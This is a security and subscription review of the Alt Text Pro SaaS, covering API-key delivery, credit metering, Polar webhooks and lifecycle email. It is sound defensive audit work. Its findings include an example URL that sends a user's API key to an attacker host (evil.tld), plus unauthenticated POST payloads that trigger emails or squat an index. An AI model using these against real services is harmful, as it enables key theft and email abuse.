# Alt Text Pro — SaaS / User Management / Subscription Review

**Date:** 2026-08-05
**Branch reviewed:** `codex/archive-ledger-2026-07-18`
**Scope:** Supabase schema + RPCs, Polar webhook/checkout/portal routes, all Netlify functions, dashboard/connect/customer-offer pages, plugin credit-consumption path.
**Status:** Review only — no code changed, no production system touched.

---

## 1. How the system actually works

| Layer | Implementation |
|---|---|
| Identity | Supabase Auth (email+password, Google OAuth, PKCE). `handle_new_user` trigger creates `profiles` row with plan `free`, 30 credits (`supabase/migrations/20260625150947_fix_handle_new_user_current_profile_schema.sql:8`) |
| Authorization | RLS owner-policies on `profiles`/`api_keys`/`usage_logs`/`payments`; all credit logic is `security definer` + `service_role` only (`supabase/migrations/20260625150407_harden_database_security.sql`) |
| Machine auth | `alt_`-prefixed API keys in `api_keys`, plaintext, validated per request (`netlify-functions/utils/api-key-validator.js:89`) |
| Billing | Polar.sh — checkout link → signed webhook → profile mutation (`frontend-next/src/app/api/webhooks/polar/route.ts`) |
| Metering | `use_credit()` RPC: row lock, monthly cap recomputed from `usage_logs`, bonus-credit fallback, usage log insert, all in one transaction (`supabase/migrations/20260728125159_add_wpgeared_customer_offer_claim.sql:451`) |
| Renewal | pg_cron: `renew_monthly_credits` (free, 30d) and `renew_paid_monthly_credits` (annual drip, 30d). Monthly paid renewal comes only from the Polar `subscription.updated` webhook |
| Admin | `SUPERUSER_EMAILS` env allow-list checked server-side on every admin function |

**What is solid:** the core metering design. Single atomic RPC, `FOR UPDATE` locking, usage recomputed from the log rather than trusting a counter, and promotional credits held in a separate ledger that survives renewals. That is the strongest code in the project.

---

## 2. Critical

### C1 — The `/connect` flow will hand a user's API key to any website that asks — ✅ FIXED 2026-08-05
`frontend-next/src/app/connect/page.tsx:106-114, 161-168, 193-205`

> **Resolution (verified 2026-08-05):** wildcard `postMessage` replaced with the confirmed callback origin
> (`page.tsx:256`); the URL-redirect delivery path removed entirely (the key never touches a URL);
> explicit confirmation screen naming the destination host added before any key is fetched
> (`page.tsx:142-183, 442-470`). `getCallbackTarget` also rejects non-http(s) schemes and embedded
> credentials. All entry points (session bootstrap, email login, OAuth return) route through
> `prepareAuthenticatedConnection`, so no ungated path remains. `tsc --noEmit` clean.
> Two follow-ups introduced by the fix are tracked as **N1** and **N2** below.

Three compounding problems:

- `callback_url` is taken from the query string and validated **only** for `http:`/`https:` — no host allow-list, no relationship to the user's own site.
- `window.opener.postMessage({api_key}, "*")` — wildcard target origin, so the key is delivered to whatever origin opened the popup.
- If a session already exists, the page **auto-fetches the key and auto-redirects with no confirmation**.

Attack: `https://www.alt-text.pro/connect?callback_url=https://evil.tld/x` — one click by a logged-in customer and their key lands in the attacker's access logs as `?alt_text_pro_api_key=...`. That key spends their credits and reads their usage. The plugin side does validate `event.origin` (`wordpress-plugin/alt-text-pro/assets/js/admin.js:113`), so the hole is entirely on the SaaS side.

**Fix:** validate `callback_url` against the site the key is being issued for (or at minimum require an explicit "Send key to `<host>`?" confirmation screen showing the hostname), send `postMessage` with the concrete origin instead of `*`, and prefer a short-lived one-time code exchanged server-to-server over putting the key in a URL.

### C2 — One-time credit packs are unusable, and are then deleted — ✅ FIXED 2026-08-05

> **Resolution (verified 2026-08-05):** migration `20260805001030_fix_purchased_credit_pack_ledger.sql`.
> Packs land in a dedicated `purchased_credits_remaining` ledger (separate from the WPGeared
> promotional ledger — see O5), which `use_credit` spends once the plan allowance is exhausted
> (`:301-302, 315-327`), so they are usable on free and paid tiers alike. `renew_monthly_credits` is
> now `greatest(credits_remaining, 30 + bonus + purchased)` (`:402-407`) and can never lower a
> balance. A backfill reconstructs historical packs from `payments`. Verified the arithmetic against
> four states (pack intact, pack wiped, partially spent, paid tier + pack) — no double-count, correct
> restore. `getMonthlyCreditState` adds both persistent ledgers, so pack-only users are not 402'd
> before reaching `use_credit`; the subscription branch writes
> `credits + bonusCredits + purchasedCredits`, so upgrading does not destroy a pack.
> `tsc --noEmit` clean, 21/21 frontend and 120/120 function tests pass.
>
> **This also closes H5** for one-time orders: `credit_pack_grants.payment_id` (PK) plus
> `on conflict do nothing` in `grant_credit_pack_purchase` gives real webhook idempotency.
>
> **Five follow-ups: O1–O5 below.**



`use_credit` caps consumption at the **plan's** monthly allowance for every plan including `free`, regardless of how many credits the balance holds (`supabase/migrations/20260728125159_add_wpgeared_customer_offer_claim.sql:517-545`). Only `bonus_credits_remaining` (the WPGeared campaign ledger) can be spent past the cap. Purchased pack credits land in `credits_remaining` (`frontend-next/src/app/api/webhooks/polar/route.ts:166-193`) and are therefore unreachable.

Then `renew_monthly_credits` overwrites the balance: `credits_remaining = 30 + bonus_credits_remaining` (`supabase/migrations/20260728125159_add_wpgeared_customer_offer_claim.sql:625`) — the purchase is erased at the next 30-day tick.

Net effect for a free user buying the **$10 "Value Pack"** advertised on the homepage as "250 Credit Injection / Never Expires" (`frontend-next/src/app/page.tsx:1150,1515`): they get 0 usable credits and the balance resets 30 days later. A paid subscriber buying a pack fares no better — usage is still capped at their tier allowance every cycle, forever.

**Fix:** route one-time purchases into `bonus_credits_remaining` (that ledger already has exactly the right semantics — spendable past the cap, preserved across renewals), and stop clobbering `credits_remaining` on free renewal.

### C3 — `/track-event` is unauthenticated and drives outbound email — ✅ FIXED 2026-08-05

> **Resolution (verified 2026-08-05):** three independent layers. (1) Endpoint: identity derived from
> the verified Supabase session, caller `user_id`/`user_email` ignored (`track-event.js:223-226`);
> `purchase_completed` server-only; reserved sources blocked; anonymous events limited to four
> non-trigger names; `occurred_at` server-set (`:232-234`), killing backdating past `delayHours`;
> CORS switched from echoing any Origin to the validated allow-list. `identity_verified` cannot be
> forged — the server value is spread last (`:205-208`). (2) Rule-level trust: each rule declares
> `trustedSources`/`allowVerifiedIdentity`, and `getLatestTriggerEvent` accepts only trusted
> triggers. Verified each string against its writer: `polar_webhook` = Polar route,
> `wordpress_plugin_auth` = `plugin-connect-event.js:70`, `wordpress_plugin_usage` =
> `credits-low-event.js:24`. `purchase_onboarding` sets `allowVerifiedIdentity: false`, so only the
> signature-verified webhook can fire the 0-hour email. (3) Recipient verification:
> `filterCandidatesByAuthUsers` requires `user_id` **and** `user_email` to match a real `auth.users`
> row; `fetchAuthUsers` throws rather than silently truncating. 139 function and 22 frontend tests
> pass. **Three follow-ups: R1–R3 below.**

`netlify-functions/track-event.js:104-139` accepts any `user_email`/`user_id`/`event_name` from an allow-list, with no auth and an echo-any-`Origin` CORS header. `netlify-functions/utils/lifecycle-automation.js:155-181` builds email candidates directly from those rows and sends to `candidate.user_email` from your Gmail/SMTP sender.

So `POST {"event_name":"signup_created","user_email":"victim@example.com"}` → ~4h later Alt Text Pro emails a stranger. **Correction (2026-08-05): the fastest path is worse.** `purchase_onboarding` triggers on `purchase_completed` with `delayHours: 0` (`utils/lifecycle-automation.js:36-38`) against a cron running every 2 hours, so a single unauthenticated POST sends "Welcome to Alt Text Pro" to an arbitrary address within ~2 hours. The Q2 fix does not reduce this — the attacker simply omits the reserved `polar_webhook` source. Also poisons the admin funnel, the daily report, and `connect_completed` attribution. Sender-reputation and CAN-SPAM exposure.

**Fix implemented locally:** `track-event` now verifies supplied session JWTs with Supabase Auth and derives `user_id`/`user_email` from the verified user. Only `page_viewed`, `demo_used`, `plugin_downloaded`, and `connect_started` may be anonymous; anonymous rows require `anonymous_id`, store no user identity, and are marked unverified. Polar and WordPress integration sources are reserved for their server-side writers, `purchase_completed` is rejected as a server-only event, and public event timestamps are assigned server-side to prevent lifecycle backdating. Lifecycle candidate selection requires either a verified browser trigger or the rule's expected server-only source; `purchase_onboarding` accepts only `polar_webhook`. Immediately before reservation/send, the scheduler paginates Supabase Auth users and requires the candidate's user ID and normalized email to match the same Auth user. Auth lookup and pagination-limit failures therefore fail closed with no email send. This is implemented and tested locally but not deployed.

### C3 follow-ups R1–R3 — fixed or recorded locally 2026-08-05

- **R1:** The original signup calls were removed from the no-session email-confirmation branches. The homepage now records `signup_created` from `/email-confirmed` after `setSession` succeeds. The WordPress-connect flow records it after the confirmation return establishes a session, using a short-lived, email-bound pending-signup marker so ordinary logins do not create signup events.
- **R2:** Existing 30-day-window rows without the new verified provenance are intentionally excluded from lifecycle candidates. This is safe and expected; the first post-deploy dry run must record rejected legacy rows separately from genuine runtime failures.
- **R3:** Lifecycle delivery now requires a matching Auth user with a non-null `email_confirmed_at`, in addition to matching user ID and normalized email.
- **S1:** Cross-device `/connect` confirmation no longer depends solely on the local pending-signup marker. When the page is reached in a real WordPress-connect context with an authenticated user, it submits `signup_created`; the endpoint checks for an existing signup event for that verified user and returns a no-op for repeats. This is implemented and tested locally but not deployed.

**Independently verified 2026-08-05** (`tsc --noEmit` clean, 139 function tests, 22 frontend tests).
R1: both signup paths covered — `page.tsx:243` now guards on `result.data.session`; `/email-confirmed`
fires after `setSession` (`:39-53, 57-68`), which is cross-device safe because it depends only on the
confirmation link; the connect flow uses a localStorage `rememberPendingSignup`/`consumePendingSignup`
handshake (24h TTL, email-matched) at `connect/page.tsx:380-388, 547`. No double-fire: the two
`/email-confirmed` call sites are mutually exclusive branches, branch 2 is gated on `type === 'signup'`,
`replaceState` clears the URL so a refresh cannot re-fire, and `consumePendingSignup` removes the key
before parsing so it is consumed exactly once. R3 confirmed at `utils/lifecycle-automation.js:231`.

- **S1 (Low, opened 2026-08-05) — cross-browser confirmation misses the connect-flow signup event.** ✅ FIXED locally 2026-08-05. Authenticated `/connect` visits in a real WordPress-connect context now submit `signup_created` even without the localStorage marker; the endpoint deduplicates the verified user. The `/email-confirmed` path remains independent of browser storage.

These changes are local only and still require staging confirmation-flow and scheduled dry-run verification before deployment.

---

## 3. High

### H1 — Payments are bound to customers only by email string

`frontend-next/src/app/api/webhooks/polar/route.ts:226-244` matches `profiles.email` with `.eq()` (case-sensitive in Postgres), falls back to scanning `auth.admin.listUsers()` (unpaginated — breaks silently past the default page size), and on no match just `console.error`s and returns. The checkout route never binds the buyer to an account — no auth check, no `metadata.user_id`, just a `customerEmail` query param the user can change on Polar's page (`frontend-next/src/app/api/checkout/route.ts:34-38`).

Result: any casing difference, any email change after signup (`profiles.email` is never re-synced from `auth.users`), or any checkout completed under a different address = paid customer with no credits, no alert, no reconciliation queue.

**Fix:** require a session on `/api/checkout` and pass `metadata: { user_id }`; match on `user_id` first, email (lowercased) second; write unmatched payloads to a `payment_reconciliation` table and alert.

### H2 — No `subscription.revoked` and no refund handling

Available and unimplemented: `onSubscriptionRevoked`, `onOrderRefunded`, `onRefundCreated`, `onSubscriptionUncanceled` (confirmed against `@polar-sh/adapter-utils`). Consequences:

- When access actually ends, `subscription_plan` stays `tier1/2/3` forever. The user keeps their remaining balance and their tier's monthly cap, and — because `renew_monthly_credits` only targets `subscription_plan = 'free'` — never returns to the free tier.
- Refunded and charged-back customers keep every credit.

### H3 — Cancelling an annual plan destroys credits the customer already paid for

`frontend-next/src/app/api/webhooks/polar/route.ts:444-452` sets `subscription_status='cancelled'`, `billing_cycle=null`, `monthly_credit_allowance=null` the moment Polar reports a cancellation. Polar fires `subscription.canceled` at cancel time, while access runs to period end. Since annual plans deliberately hold only one month's credits at a time (drip design), an annual subscriber who cancels in month 2 loses the 10 months they've paid for — and the drip cron can never restore it. This is a refund/chargeback generator.

**Fix:** treat `canceled` as "will not renew" (set an `ends_at`), and only downgrade on `revoked`.

### H4 — Subscription revenue is double-counted

`onOrderPaid` inserts a `payments` row for **every** order including subscription initial + renewal orders (the insert at `route.ts:252` happens *before* the `isSubscription` early-return at `:306`). `onSubscriptionUpdated` then inserts a second row for the same renewal (`route.ts:563`). Every admin revenue figure derived from `payments` is inflated.

### H5 — No webhook idempotency for one-time purchases

No event-ID dedup anywhere, and `payments.payment_id` carries no unique constraint (`supabase-migration/create-payments-table.sql`). A Polar retry on `order.paid` re-runs `updateUserCredits(..., false)` and grants the pack again. (Subscription renewals are accidentally protected by the `credits_last_renewed_at` comparison — that's luck, not design.)

**Fix:** unique index on `payments.payment_id`, insert-first-then-grant, and treat `23505` as "already processed".

### H6 — Plan-name matching collides with your own brand name

`frontend-next/src/lib/polar-plan-mapping.ts:4` maps the substring `"pro"` → `tier3`, and `isPolarSubscriptionProduct` returns true for `tier3`. Any Polar product named with "Alt Text **Pro**" in it that isn't a subscription — e.g. "Alt Text Pro — Value Pack" — is classified as a subscription, so `onOrderPaid` **skips credit allocation entirely** and no subscription webhook ever arrives. Customer pays, receives nothing.

Whether this is live depends on the exact Polar product names and whether each product carries `metadata.plan_id` / `metadata.type` (both are checked first). **Verify in the Polar dashboard** — 5-minute check, silent total-loss failure if it's hit.

### H7 — `credit_pack` is not a valid `plan_id`

`resolvePolarPlanId` returns `credit_pack`, but `subscription_plans` only ever received `pay_as_go` and `small_pack` (`supabase-migration/update-pricing-2024.sql:41-46`, `supabase-migration/update-pricing-polar-migration.sql`). `payments.plan_id` has an FK to that table, so every Value Pack purchase should fail its `payments` insert (logged, swallowed, never recorded). Also note the DB's pack rows are stale — `$3/350` and `$5/550` vs the site's `$5/100` and `$10/250`.

---

## 4. Medium

- **M1 — Stricter admin rate limits are silently ignored.** `netlify-functions/utils/rate-limiter.js:56,141-156` builds one `Ratelimit` at `slidingWindow(60, '60 s')` and ignores the `maxRequests` argument whenever Upstash is configured. So `delete-users`' intended 10/min and `admin-get-users`' 30/min are both actually 60/min in production.
- **M2 — Rollover is fictional.** `onSubscriptionUpdated` adds `creditsToGrant + existingCredits` (`route.ts:530-535`) and the annual drip accumulates too, but the per-cycle cap means the surplus can never be spent. Balance grows unboundedly and is shown raw in some places (`auth-validate` and the generate response feed `wordpress-plugin/alt-text-pro/includes/class-media-handler.php:102`) — a customer can see "1,400 credits" and get a 402.
- **M3 — AI spend precedes metering.** `netlify-functions/generate-alt-text.js:939-1020` generates first, deducts after. A failed deduction returns 500 with the Gemini cost already incurred, and concurrent bulk requests can all pass the pre-check and over-generate (credits never go negative — `use_credit` is safe — but you pay for the excess).
- **M4 — Rate limiting is IP-only, shared across endpoints, with no per-key quota.** A WordPress site doing bulk work is one IP against a 60/min budget shared with every other endpoint; conversely a stolen API key is unthrottled across many IPs.
- **M5 — Weak fallback API-key generation.** `netlify-functions/get-api-key.js:99` builds a key from the user's UUID prefix + `Date.now()` + `Math.random()`. The primary RPC path uses `gen_random_bytes(32)` correctly; this fallback is guessable. Keys are also stored in plaintext (hashing them would be the standard hardening).
- **M6 — The migration history is not bootstrappable.** `supabase/migrations/` contains 7 files that all assume pre-existing tables; the real schema lives in ad-hoc `supabase-migration/*.sql` applied by hand in unclear order. The database cannot be rebuilt from the repo — a material disaster-recovery gap. Related: `supabase/migrations/20260728125159_add_wpgeared_customer_offer_claim.sql:609` renames the `renew_monthly_credits` OUT column (`user_ids` → `renewed_user_ids`) via `CREATE OR REPLACE`, which Postgres rejects without a prior `DROP FUNCTION` — so this file is not replayable on any environment where the older function exists.
- **M7 — Shadowed variable in `get-usage`.** `netlify-functions/get-usage.js:56` vs `:65` declares `userId` twice; the API-key branch assigns the inner one, leaving the outer `null`. Currently harmless only because `authUser.id` is the same value at `:135`. It will bite whoever edits this next.
- **M8 — Stale/legacy surface.** `public.users` table, PayPal-era `upgrade_subscription`/`cancel_subscription`, the localhost branch that queries Supabase directly instead of the API (`frontend-next/src/app/dashboard/page.tsx:114`), and a `netlify.toml` redirect to a non-existent `activate-subscription` function.

---

## 4b. Follow-ups introduced by the C1 fix (2026-08-05)

> **N1 and N2 resolved 2026-08-05** (plugin 1.7.11 + connect page). N1: `showManualRecovery`
> (`connect/page.tsx:155-166, 345-351, 365-372, 572-608`) now renders the key with a copy button
> whenever the opener is missing or delivery fails. N2: real ack handshake — the popup waits for
> `ALT_TEXT_PRO_CONNECT_ACK` matched on `event.source`, `event.origin`, `request_id` and `state`
> with a 10s timeout (`connect/page.tsx:176-245`), and the plugin acks only after the save AJAX
> succeeds (`admin.js:854-869`). `tsc --noEmit` and `node --check` both clean.
> **Two new follow-ups: N3 and N4 below.**
>
> Empirical COOP check on the Google OAuth chain (2026-08-05): `accounts.google.com/o/oauth2/v2/auth`
> and `/v3/signin/identifier` send `cross-origin-opener-policy-report-only: same-origin` (staged,
> **not** enforced), while `/signin/oauth/error` sends an **enforcing**
> `cross-origin-opener-policy: same-origin`. So the OAuth success path preserves `window.opener`
> today, but any OAuth error page severs it permanently, and Google is clearly staging full
> enforcement. The N1 fallback makes this a non-event either way.

- **N1 (Medium) — no escape hatch when `window.opener` is gone.** ✅ FIXED 2026-08-05. Removing the redirect fallback left a hard error as the only outcome (`frontend-next/src/app/connect/page.tsx:236,265`), and `/connect` has no manual key display. **Test the Google OAuth path specifically:** the popup navigates to `accounts.google.com` and back, and a `Cross-Origin-Opener-Policy` header anywhere in that chain permanently severs `window.opener` — in which case Google sign-in connect fails outright where it previously fell back to a redirect. Better failure mode: render the key on screen with a copy button. Showing it to the signed-in user is not a security downgrade; sending it to an unverified third-party origin was.
> **N3 and N4 resolved 2026-08-05.** N3: `pluginSupportsConnectAcknowledgement`
> (`connect/page.tsx:19-38`) gates the ack on `plugin_version >= 1.7.11`, applied at
> `connect/page.tsx:408-428`; older plugins keep the post-and-assume-success path. The comparison is
> numeric per-segment, so 1.7.9 correctly reads as older than 1.7.11, and an unparseable or missing
> version falls back to the legacy path (fail-safe). N4: ack timeout raised to 25s with a
> "Still waiting…" interim message at 4s (`connect/page.tsx:278-283`). Plugin acks fire before the
> 1.5s `location.reload()` and on both failure branches (`admin.js:892-930`). `tsc --noEmit`,
> `node --check` and `php -l` all clean; plugin header, version constant, `Stable tag` and changelog
> all aligned at 1.7.11. **One new follow-up: N5 below.**
>
> Note: `plugin_version` is attacker-controllable (query string), but forging it only downgrades to
> the legacy delivery path — the key still goes solely to the confirmed callback origin and still
> requires user confirmation. No security impact.

- **N5 (Low, opened 2026-08-05) — the legacy path claims a confirmation that never happened.** ✅ FIXED 2026-08-05. The status message is now conditional on the same `requiresConnectAcknowledgement` flag that gates the actual behavior (`connect/page.tsx:371,409,448-452`), computed once and reused so wording can't drift from what happened: "Connected. WordPress confirmed the key was saved." on the ack path (≥1.7.11), "Key sent to WordPress." on the legacy path (≤1.7.10). The `connected` success screen (`:672-688`) renders `statusMessage` directly rather than holding its own separate claim, so it inherits the fix automatically. `tsc --noEmit` clean.
- **N3 (High — pre-deploy blocker, opened 2026-08-05) — the ack requirement breaks every plugin version already installed.** ✅ FIXED 2026-08-05. The local plugin is 1.7.11; the latest WordPress.org release is 1.7.10. Versions ≤1.7.10 receive `ALT_TEXT_PRO_CONNECTED`, save the key successfully, and **never send an ack** — that code does not exist in them. The popup therefore always hits the 10s timeout and shows "We could not confirm that WordPress saved your key" to every existing customer, despite the save having worked. The website deploys instantly while plugin updates propagate over weeks, so this affects effectively 100% of connects immediately after deploy. `plugin_version` is already passed to `/connect` and parsed (`connect/page.tsx:140,323`) but never used — gate on it: require the ack only when `plugin_version >= 1.7.11`, otherwise keep the post-and-assume-success path. Partially mitigated by the recovery copy ("The plugin may already have saved this key"), which reduces this to confusion rather than failure.
- **N4 (Low, opened 2026-08-05) — 10s ack timeout may be too tight.** ✅ FIXED 2026-08-05 (raised to 25s + interim status). The plugin acks only after its `alt_text_pro_validate_key` AJAX completes, which itself round-trips from the customer's server to the Netlify `auth-validate` function (cold start possible). On slow shared hosting that can exceed 10s, producing a false "could not confirm" on an otherwise successful connect. Suggest 20–30s, or an interim "still waiting…" state before falling back.
- **N2 (Low-Medium) — a dropped `postMessage` is reported as success.** ✅ FIXED 2026-08-05. `postMessage` does not throw when the opener's real origin differs from `target.origin`; the browser silently discards it, `postedToOpener` stays `true`, and the UI says "Connected. Closing this window…". Triggered whenever `admin_url()`'s origin ≠ the origin the admin is actually viewed on (www vs non-www, http behind an https proxy, multisite domain mapping). Fix with an ack message from the plugin, or do not claim success until the plugin confirms receipt.
- **Residual by design:** the callback host remains fully attacker-chooseable; security now rests on the user reading the hostname on the confirmation screen. This is the standard OAuth consent model and is an acceptable trade-off. The stronger version is server-side site registration, issuing keys only to hosts the account has claimed.
- **Now dead code:** the plugin's `checkConnectCallback` URL-param handler (`wordpress-plugin/alt-text-pro/assets/js/admin.js:899`) is unreachable — nothing redirects with the key any more. Worth deleting so nobody later assumes that fallback still exists.

---

## 4c. Follow-ups from the C2 fix (2026-08-05)

> **O1–O5 all resolved 2026-08-05** (verified: `tsc --noEmit` clean, 21/21 frontend tests,
> 120/120 function tests). O1: webhook rethrows; confirmed the SDK does not swallow it —
> `Webhooks()` awaits `handleWebhookPayload` with no try/catch, so a throw returns 500 and Polar
> retries. Migration-first ordering recorded in `RELEASE_CHECKLIST.md` step 6. O2/H7: catalog rows
> inserted with `on conflict do nothing`. O3: backfill insert is now idempotent. O4: pack sizes
> derived from plan/product **and** amount, including legacy $3/350 and $5/550. O5: separate
> `purchased_credits_remaining` ledger threaded through `use_credit`, the grant RPC,
> `renew_monthly_credits`, `getMonthlyCreditState`, `validateApiKey`, `generate-alt-text`,
> `get-usage` and all three dashboard load paths. The subscription branch correctly adds
> `purchasedCredits`, without which subscribing would have destroyed a customer's pack.
> **Five new follow-ups: P1–P5 below.**
>
> **Production finding (recorded by the maintainer, not independently verified):** production has
> valid `small_pack`/`credit_pack`/`pay_as_go` catalog rows and **no completed pack payments** —
> only one pending `small_pack` row at amount 0. If that is accurate, no customer was harmed by C2
> and the backfill is a no-op. The open question is why: either packs have never sold, or they sold
> and were never recorded. **If Polar shows completed one-time orders that `payments` lacks, H6 is
> actively eating pack sales** (the `"pro"` substring collision classifies a pack as a subscription,
> `onOrderPaid` returns early, customer receives nothing). This reconciliation is now the
> highest-value open item.


- **O1 (High — deploy ordering) — apply the migration BEFORE the Netlify deploy.** The new webhook calls `grant_credit_pack_purchase`. If the site ships first, the RPC does not exist, `updateUserCredits` throws, `onOrderPaid`'s catch swallows it, Polar receives a 200 and never retries — the customer pays and receives nothing. Migration-first is safe: the old code does not reference the new function.
- **O2 (Medium) — the backfill cannot see packs that H7 prevented from being recorded.** Recovery reads `public.payments`, but H7 (plan_id `credit_pack` violates the FK to `subscription_plans`) means Value Pack purchases likely never produced a payments row. Those customers recover nothing, and future pack purchases still will not be recorded (credits are granted regardless — the RPC is decoupled from the payments insert — but revenue tracking stays broken). Because `renew_monthly_credits` now uses `greatest()`, an unrecovered pack balance is no longer wiped, but without a ledger entry it stays unspendable past the monthly cap. Fix H7 alongside. Check first: `select count(*), plan_id from payments where plan_id in ('small_pack','credit_pack') or product_name ilike '%pack%' group by plan_id;`
- **O3 (Low) — the backfill is not re-runnable.** `insert into credit_pack_grants ... select` (`migration:98`) has no `on conflict (payment_id) do nothing`, so a second apply raises a duplicate-key error. It fails closed inside the migration transaction rather than double-granting — the safe direction — but adding the clause would make it idempotent like the rest of the file.
- **O4 (Low) — the backfill hardcodes 100/250 credits.** Historical purchases made under older pack sizes would be restored at the wrong amount; note `subscription_plans` still claims `small_pack = 350` and `pay_as_go = 550`. Eyeball the actual `amount` values in `payments` before applying.
- **O5 (Low, copy) — purchased packs now display as "promotional credits."** `frontend-next/src/app/dashboard/page.tsx:90-94` renders `bonus_credits_remaining` as "N promotional credits remain in addition to your plan allowance." That field is now shared between the WPGeared campaign and paid packs, so a customer sees a purchase described as promotional.

## 4d. Follow-ups from the O1–O5 fixes (2026-08-05)

> **P1, P2, P3, P5 resolved 2026-08-05** (verified: `tsc --noEmit` clean, 21/21 frontend,
> 120/120 function tests). P1: dedup pass + `payments_payment_id_uidx`, plus a partial unique index
> on `marketing_events (event_name, source, properties->>'order_id')`; `recordPayment` and
> `recordMarketingEvent` treat `23505` as already-recorded. P2: fulfillment now precedes bookkeeping
> for one-time purchases; the subscription retry path is self-healing. P3: the backfill UPDATE is
> guarded to pack owners only. P5: `profiles_purchased_credits_remaining_nonnegative` added, and the
> drain order reversed to promotional-first (verified exactly one ledger decrements per credit,
> in step with `credits_remaining`).
> **P4, Q1, and Q2 are resolved locally. Two signup-analytics follow-ups, T1 and T2, are tracked below.**

- **P1 (High) — webhook retries now duplicate `payments` rows.** `payments.payment_id` still has no unique constraint (the only unique index in the whole migration set is `campaign_offer_one_claim_per_user`). Previously errors were swallowed so retries never occurred; now they do, and each retry re-inserts the same `polar_ord_<id>` row plus a duplicate `marketing_events` row. Credits are safe (the RPC is idempotent) but revenue reporting is not, and this compounds H4. Add `create unique index on public.payments (payment_id)` and treat `23505` as already-recorded.
- **P2 (Medium) — bookkeeping now gates fulfillment.** The payments insert throws *before* credits are granted, so a permanent insert failure means Polar retries, gives up, and the customer never receives credits — the old code granted anyway. The FK cause is fixed so this is largely theoretical, but the safer order is grant (idempotent) → record (idempotent) → throw.
- **P3 (Medium) — the backfill's second UPDATE now touches every profile.** It changed from `join pack_totals` to `left join` (`migration:195`), so for non-pack users it sets `credits_remaining = greatest(current, unused_allowance + bonus)`, raising the balance of anyone deliberately reduced below their unused monthly allowance (admin adjustment, refund clawback, manual zeroing). This contradicts the release gate "backfilled once and reconciled without changing unrelated users." Restore the inner `join`, or add `where state.pack_credits > 0 or state.current_purchased_credits > 0`.
- **P4 (Low) — discounted purchases can be mis-sized by the backfill.** ✅ FIXED 2026-08-05 — `polar_product_id is not null or coalesce(discount_amount,0) > 0` now takes priority over the legacy amount thresholds across all four match branches (`migration:247-294`). Correct because `polar_product_id` exists only on Polar-era rows, so pre-Polar payments still fall through to the $3/350 and $5/550 thresholds. Previously reported as: STILL OPEN as of 2026-08-05 — the CASE still uses bare `coalesce(p.amount, 0) <= 3.50` / `>= 8.00` (`migration:191-211`); neither `discount_amount` nor `polar_product_id` appears in the migration. Inert today only because the backfill matches nothing in production — inert by circumstance, not by fix. If accepted deliberately, record it as a decision; the migration would misfire against any database that does have discounted pack history. `payments.amount` is `totalAmount` (post-discount), so a ≥30% discount on the current $5 small pack falls into the `<= 3.50` branch and grants 350 instead of 100. Use `amount + discount_amount`, or match on `polar_product_id`. Moot if the backfill matches nothing.
- **P5 (Low) — missing constraint and a drain-order design note.** `purchased_credits_remaining` has no non-negative CHECK, unlike `profiles_bonus_credits_remaining_nonnegative`. Separately, `use_credit` (`migration:321-327`) drains **purchased before promotional**; neutral today since neither expires, but if promotional credits are ever given an expiry, pack buyers will have burned their paid credits first. Conventional order is promotional first.

- **Q1 (Medium, opened 2026-08-05) — the payments dedup hard-DELETEs from a financial table.** ✅ FIXED 2026-08-05. `payments_duplicate_archive` (`migration:7-58`) captures every losing row as `to_jsonb(p)` before the delete, with RLS on, service_role-only grants, a unique `source_row_id` making the archive step retry-safe, and a `payment_id` index. Verified the archive and delete select identical rows: both recompute the same deterministic window function in one transaction over unchanged data. Correctly scoped to the financial table; the `marketing_events` dedup remains a plain delete, which is appropriate for analytics rows. Release gate now has an exact query: `select count(*) from public.payments_duplicate_archive`. `migration:20-23` permanently removes duplicate `payments` rows with no archive. It should be a near-no-op today (retries never fired while errors were swallowed, and H4's double-records carry distinct ids — `polar_renewal_<id>_<timestamp>` — so they are untouched), but it is irreversible and it moves revenue totals. Copy the losing rows to an archive table first, or run the `ranked_payments` SELECT standalone and record the count in the release log before applying. This belongs in the existing "backfill counts" gate.
- **Q2 (Low, opened 2026-08-05) — the new marketing_events unique index gives C3 a new lever.** ✅ FIXED 2026-08-05. Reserved-source guard at `track-event.js:112-122`, case-insensitive and applied to every event name, with two tests (122/122 function tests pass). No bypass found: `textValue` trims before comparison; JS `toLowerCase()` is locale-independent so the Turkish-İ class does not apply (and the string contains no `i`); a Kelvin-sign homoglyph is blocked by the guard and would not match the byte-comparing SQL index. Enumerated every other `marketing_events` writer — `plugin-connect-event.js` hardcodes its source, `credits-low-event.js` only writes `credits_low` and is API-key gated, the Polar route is signature-verified — so `track-event` was the only unauthenticated writer able to set both `event_name` and `source`. `purchase_completed` is in `track-event.js`'s `ALLOWED_EVENTS` and `source` is caller-supplied, so an unauthenticated attacker can post `{event_name:"purchase_completed", source:"polar_webhook", properties:{order_id:"X"}}` and squat the unique key; the genuine webhook then hits `23505`, treats it as already-recorded and silently skips. Analytics-only impact (it runs after fulfillment, so credits are unaffected), but another concrete reason to close C3.
## 4e. Signup-event deduplication and funnel-transition follow-ups (2026-08-05)

- **T1 (Low) — the existing signup deduplication was check-then-insert.** The endpoint's per-user lookup prevented ordinary repeat submissions but did not close the race between two concurrent requests. Read-only production inspection found zero extra `signup_created` rows and zero duplicate user groups. ✅ FIXED locally: the pending migration now performs a deterministic duplicate cleanup before adding the partial unique index `marketing_events_signup_per_user_uidx` on `(user_id)` for non-null `signup_created` rows, and `track-event.js` treats a signup insert `23505` as an idempotent duplicate. A regression test covers the concurrent-insert outcome. The migration and Netlify change are not deployed.
- **T2 (Low) — funnel counts will temporarily need contextual interpretation.** Google-OAuth signup handling historically went directly to `/dashboard` without creating `signup_created`. A later authenticated `/connect` visit can now create the missing event, using `signup_method=authenticated_connect_visit`; if the user abandons that flow, the normal `signup_no_connect` send may occur once. This is contextually valid but can inflate recent signup/connect counts relative to historical data. R2's legacy-row rejection has the same operational effect. ✅ DOCUMENTED: the release checklist requires the first post-deploy dry run/report to record legacy rejections, verified candidates, and the connect-visit segment separately. No historical backfill or live data mutation is planned.

## 4f. Signup-index migration safety follow-up (2026-08-05)

- **U1 (Low) — the signup unique index initially relied on a time-sensitive preflight.** Unlike the payment and Polar purchase-event indexes, it had no in-migration cleanup. A duplicate could arrive after the read-only check but before migration execution and abort the complete credit-pack migration. ✅ FIXED locally: immediately before `marketing_events_signup_per_user_uidx`, the pending migration now ranks `signup_created` rows by `(occurred_at, created_at, id)` per non-null `user_id` and deletes rows with rank greater than one. The earliest row is retained deterministically. The latest production read-only check still found zero extra rows; no live cleanup or schema change was performed.

---

## 5. Low / hygiene

